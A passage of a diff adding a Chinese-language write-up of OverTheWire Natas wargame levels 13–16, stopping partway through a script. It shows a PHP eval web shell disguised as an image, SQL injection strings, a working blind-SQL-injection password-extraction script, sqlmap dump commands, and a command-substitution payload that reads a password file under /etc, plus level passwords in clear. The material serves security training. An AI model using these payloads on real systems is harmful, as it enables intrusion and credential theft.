+<span class="cp">    }</span>
+<span class="cp">} else {</span>
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;MAX_FILE_SIZE&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1000&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;filename&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> <span class="p">/&gt;</span>
+Choose a JPEG to upload (max 1KB):<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;uploadedfile&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Upload File&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="cp">&lt;? } ?&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>在<code>hack.php</code>中添加任意图片文件文件头即可绕过<code>exif_imagetype</code>检查
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="x">BM</span>
+<span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+</td></tr></table></li>
+<li>接下来，修改前端文件后缀名、上传文件、使用菜刀的步骤、方法与 <a href="#level-12">Level 12</a> 一致<br>
+<img alt="Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1" src="img/natas30.jpg" /></li>
+</ul>
+<h3 id="_3">参考资料<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p><a href="https://www.php.net/manual/en/function.exif-imagetype.php">PHP: exif_imagetype - Manual</a></p>
+<h2 id="level-14">Level 14<a class="headerlink" href="#level-14" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas14</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas14.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>一个用户登录的表单<br>
+<img alt="Username / Password" src="img/natas31.jpg" /></li>
+<li>从源代码可以看到，提交的表单字符串未经过任何过滤，直接被拼接到了 SQL 语句中
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas14<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+<span class="cp">if(array_key_exists(&quot;username&quot;, $_REQUEST)) {</span>
+<span class="cp">    $link = mysql_connect(&#39;localhost&#39;, &#39;natas14&#39;, &#39;&lt;censored&gt;&#39;);</span>
+<span class="cp">    mysql_select_db(&#39;natas14&#39;, $link);</span>
+
+<span class="cp">    # 注意是双引号</span>
+<span class="cp">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;;</span>
+<span class="cp">    if(array_key_exists(&quot;debug&quot;, $_GET)) {</span>
+<span class="cp">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+
+<span class="cp">    if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {</span>
+<span class="cp">            echo &quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">            echo &quot;Access denied!&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">    mysql_close($link);</span>
+<span class="cp">} else {</span>
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="cp">&lt;? } ?&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>使用最简单的 SQL 注入方式即可<br>
+<img alt="&quot; or &quot;1&quot;=&quot;1 或 &quot; or 1=1#" src="img/natas32.jpg" /></li>
+<li>下一关口令 GET✔<br>
+<img alt="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" src="img/natas33.jpg" /></li>
+</ul>
+<h2 id="level-15">Level 15<a class="headerlink" href="#level-15" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas15</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas15.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>输入用户名，检查该用户是否存在<br>
+<img alt="Check existence" src="img/natas34.jpg" /></li>
+<li>查看源码，其中提供了 users 数据库表结构，各字段的类型及长度限制
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas15<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+
+<span class="cp"># 提供了 users 数据库表结构</span>
+<span class="cp">/*</span>
+<span class="cp">CREATE TABLE `users` (</span>
+<span class="cp">  `username` varchar(64) DEFAULT NULL,</span>
+<span class="cp">  `password` varchar(64) DEFAULT NULL</span>
+<span class="cp">);</span>
+<span class="cp">*/</span>
+
+<span class="cp">if(array_key_exists(&quot;username&quot;, $_REQUEST)) {</span>
+<span class="cp">    $link = mysql_connect(&#39;localhost&#39;, &#39;natas15&#39;, &#39;&lt;censored&gt;&#39;);</span>
+<span class="cp">    mysql_select_db(&#39;natas15&#39;, $link);</span>
+
+<span class="cp">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span>
+<span class="cp">    if(array_key_exists(&quot;debug&quot;, $_GET)) {</span>
+<span class="cp">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">    $res = mysql_query($query, $link);</span>
+<span class="cp">    if($res) {</span>
+<span class="cp">    # 查询结果不直接回显</span>
+<span class="cp">    if(mysql_num_rows($res) &gt; 0) {</span>
+<span class="cp">        echo &quot;This user exists.&lt;br&gt;&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">        echo &quot;This user doesn&#39;t exist.&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">    } else {</span>
+<span class="cp">        echo &quot;Error in query.&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+
+<span class="cp">    mysql_close($link);</span>
+<span class="cp">} else {</span>
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Check existence&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="cp">&lt;? } ?&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>由于查询结果不能回显到前端，需要进行 SQL 盲注（<em>blind-based SQL injection</em>）</li>
+<li>需要获取的是用户 <strong>natas16</strong> 的口令，查询、确认该用户存在<br>
+<img alt="用户 natas16 存在" src="img/natas35.jpg" /></li>
+<li>通过布尔型 SQL 盲注获取 32 位的口令
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># -*- coding: UTF-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">lxml</span> <span class="kn">import</span> <span class="n">etree</span>
+
+<span class="n">auth_username</span> <span class="o">=</span> <span class="s1">&#39;natas15&#39;</span>
+<span class="n">auth_password</span> <span class="o">=</span> <span class="s1">&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://natas15.natas.labs.overthewire.org&#39;</span>
+
+<span class="n">table</span> <span class="o">=</span> <span class="s1">&#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
+    <span class="n">l</span><span class="p">,</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">61</span>
+    <span class="k">while</span> <span class="n">l</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">:</span>
+        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
+        <span class="n">ch</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">mid</span><span class="p">]</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/index.php&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span> <span class="p">:</span> <span class="s1">&#39;&quot; UNION SELECT * FROM users WHERE username = &quot;natas16&quot; and ascii(SUBSTRING(password, </span><span class="si">%d</span><span class="s1">, 1)) &gt;= ascii(&quot;</span><span class="si">%s</span><span class="s1">&quot;)#&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">ch</span><span class="p">)},</span> <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="n">auth_username</span><span class="p">,</span> <span class="n">auth_password</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Connection&#39;</span><span class="p">:</span><span class="s1">&#39;close&#39;</span><span class="p">})</span>
+        <span class="n">sqlres</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">HTML</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s1">&#39;/html/body/div/text()&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">if</span> <span class="s2">&quot;This user exists&quot;</span> <span class="ow">in</span> <span class="n">sqlres</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="n">ans</span> <span class="o">=</span> <span class="n">mid</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+    <span class="n">key</span> <span class="o">+=</span> <span class="n">table</span><span class="p">[</span><span class="n">ans</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>也可以使用<code>sqlmap</code>
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="c1"># 枚举数据库</span>
+$ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type<span class="o">=</span>basic --auth-cred<span class="o">=</span>natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data<span class="o">=</span><span class="nv">username</span><span class="o">=</span>natas16 --dbms<span class="o">=</span>mysql --level<span class="o">=</span><span class="m">5</span> --dbs
+...
+available databases <span class="o">[</span><span class="m">2</span><span class="o">]</span>:
+<span class="o">[</span>*<span class="o">]</span> information_schema
+<span class="o">[</span>*<span class="o">]</span> natas15
+...
+
+<span class="c1"># 表名已知，直接获取 users 表</span>
+$ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type<span class="o">=</span>basic --auth-cred<span class="o">=</span>natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data<span class="o">=</span><span class="nv">username</span><span class="o">=</span>natas16 --dbms<span class="o">=</span>mysql --level<span class="o">=</span><span class="m">5</span> -D natas15 -T users --dump
+...
+Database: natas15
+Table: users
+<span class="o">[</span><span class="m">4</span> entries<span class="o">]</span>
++----------+----------------------------------+
+<span class="p">|</span> username <span class="p">|</span> password                         <span class="p">|</span>
++----------+----------------------------------+
+<span class="p">|</span> bob      <span class="p">|</span> 6P151OntQe                       <span class="p">|</span>
+<span class="p">|</span> charlie  <span class="p">|</span> HLwuGKts2w                       <span class="p">|</span>
+<span class="p">|</span> alice    <span class="p">|</span> hROtsfM734                       <span class="p">|</span>
+<span class="p">|</span> natas16  <span class="p">|</span> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh <span class="p">|</span>
++----------+----------------------------------+
+...
+</code></pre></div>
+</td></tr></table></li>
+</ul>
+<h3 id="_4">参考资料<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://portswigger.net/web-security/sql-injection/blind">What is Blind SQL Injection? Tutorial &amp; Examples | Web Security Academy</a></li>
+<li><a href="https://stackoverflow.com/a/5629121/13542937">How can I make SQL case sensitive string comparison on MySQL? - Stack Overflow</a></li>
+<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Usage · sqlmapproject/sqlmap Wiki</a></li>
+</ul>
+<h2 id="level-16">Level 16<a class="headerlink" href="#level-16" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas16</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas16.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>是 <a href="#level-10">Level 10</a> 的加强版(—ˋωˊ—)<br>
+<img alt="For security reasons, we now filter even more on certain characters" src="img/natas36.jpg" /></li>
+<li>与 <a href="#level-10">Level 10</a> 的主要区别为多过滤了反引号、单双引号，并且在执行<code>grep</code>命令的语句中，使用双引号包裹了<code>$key</code>变量
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas16<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+
+For security reasons, we now filter even more on certain characters<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+Find words containing: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">needle</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">Search</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+
+Output:
+<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+<span class="cp">$key = &quot;&quot;;</span>
+
+<span class="cp">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {</span>
+<span class="cp">    $key = $_REQUEST[&quot;needle&quot;];</span>
+<span class="cp">}</span>
+
+<span class="cp">if($key != &quot;&quot;) {</span>
+<span class="cp">    if(preg_match(&#39;/[;|&amp;`\&#39;&quot;]/&#39;,$key)) {</span>
+<span class="cp">        print &quot;Input contains an illegal character!&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">        # 无论什么输入都只能作为模式字符串</span>
+<span class="cp">        passthru(&quot;grep -i \&quot;$key\&quot; dictionary.txt&quot;);</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+<span class="cp">?&gt;</span>
+<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>还剩下命令替换<code>$(cmd)</code>没有被过滤，可使用类似 <a href="#level-15">Level 15</a> 的方法依次获取下一关口令字符</li>
+<li>提交<code>?needle=$(grep -E ^.{n-1}X /etc/natas_webpass/natas17)Allah</code>，即查看<code>/etc/natas_webpass/natas17</code>内字符串的第 <em>n</em> 位是否为 <em>X</em>，若是，返回值不为空，与其后紧随的单词组合导致无法在<code>dictionary.txt</code>查找到该词，返回为空，否则将在 <em>Output</em> 处有输出
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># -*- coding: UTF-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">lxml</span> <span class="kn">import</span> <span class="n">etree</span>
+
+<span class="n">auth_username</span> <span class="o">=</span> <span class="s1">&#39;natas16&#39;</span>
